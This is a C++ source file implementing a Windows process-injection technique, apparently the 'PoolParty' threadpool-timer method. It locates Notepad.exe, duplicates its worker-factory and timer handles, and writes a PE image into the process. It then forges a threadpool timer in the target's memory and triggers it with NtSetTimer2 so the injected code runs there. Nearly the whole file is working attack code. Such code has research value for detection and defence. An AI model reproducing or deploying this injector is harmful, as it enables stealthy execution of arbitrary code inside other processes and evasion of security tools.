#include "Misc.hpp"
#include "Native.hpp"
#include "ThreadPool.hpp"
#include "SelfPEInject.hpp"

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define WORKER_FACTORY_ALL_ACCESS  (0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x00010 | 0x00020)
#define POOL_PARTY_JOB_NAME L"PoolPartyJob"
#define ProcessHandleInformation 51
#define POOL_PARTY_FILE_NAME L"PoolParty.txt"
#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"
#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }
#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
HANDLE getProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;

}

int main() {
	SIZE_T byteWritten;
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	LPHANDLE pDuplicateHandle = new HANDLE;
	DWORD PID = 0;
	HANDLE hProc = getProcHandlebyName((LPWSTR)L"Notepad.exe", &PID);
	if (!hProc) {
		DEBUG("[x] Cannot open the process\n");
		return -1;
	}

	NTSTATUS ntStatus;
	vector<BYTE> information;
	ULONG returnLength = 0;
	do {
		information.resize(returnLength);
		ntStatus =
			NtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
		//STATUS_INFO_LENGTH_MISMATCH
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandle,
			WORKER_FACTORY_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded: %p\n", GetLastError());
			//return -1;
			continue;
		}

		vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*pDuplicateHandle,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		wcout << wstring(pObjectInformation->TypeName.Buffer) << endl;
		if (wstring(pObjectInformation->TypeName.Buffer) == L"TpWorkerFactory") {
			break;
		}
	}


	LPHANDLE phTimer = new HANDLE;

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			phTimer,
			TIMER_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded: %p\n", GetLastError());
			//return -1;
			continue;
		}


		vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*phTimer,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		wcout << wstring(pObjectInformation->TypeName.Buffer) << endl;
		if (wstring(pObjectInformation->TypeName.Buffer) == L"IRTimer") {
			break;
		}
	}

	LPVOID OEP = WritePEToTarget(hProc);

	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	NtQueryInformationWorkerFactoryPtr NtQueryInformationWorkerFactoryfn = (NtQueryInformationWorkerFactoryPtr)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
	ntStatus = NtQueryInformationWorkerFactoryfn(
		*pDuplicateHandle,
		WorkerFactoryBasicInformation,
		&WorkerFactoryInformation,
		sizeof(WorkerFactoryInformation),
		nullptr
	);
	if (!NT_SUCCESS(ntStatus)) {
		DEBUG("[x] Failed to NtQueryInformationWorkerFactory : %p \n", ntStatus);
		return -1;
	}

	const auto pTpTimer = (PFULL_TP_TIMER)CreateThreadpoolTimer(static_cast<PTP_TIMER_CALLBACK>(OEP), nullptr, nullptr);
	const auto RemoteTpTimerAddress = static_cast<PFULL_TP_TIMER>(VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	const auto Timeout = -10000000;
	pTpTimer->Work.CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
	pTpTimer->DueTime = Timeout;
	pTpTimer->WindowStartLinks.Key = Timeout;
	pTpTimer->WindowEndLinks.Key = Timeout;
	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
	pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

	WriteProcessMemory(hProc, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), nullptr);

	auto TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
	WriteProcessMemory(hProc,
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
		reinterpret_cast<PVOID>(&TpTimerWindowStartLinks),
		sizeof(TpTimerWindowStartLinks), nullptr);

	auto TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
	WriteProcessMemory(hProc,
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root,
		reinterpret_cast<PVOID>(&TpTimerWindowEndLinks),
		sizeof(TpTimerWindowEndLinks), nullptr);

	LARGE_INTEGER ulDueTime{ 0 };
	ulDueTime.QuadPart = Timeout;
	T2_SET_PARAMETERS Parameters{ 0 };
	NtSetTimer2Ptr NtSetTimer2fn = (NtSetTimer2Ptr)GetProcAddress(hNtdll, "NtSetTimer2");

	NtSetTimer2fn(*phTimer, &ulDueTime, nullptr, &Parameters);


}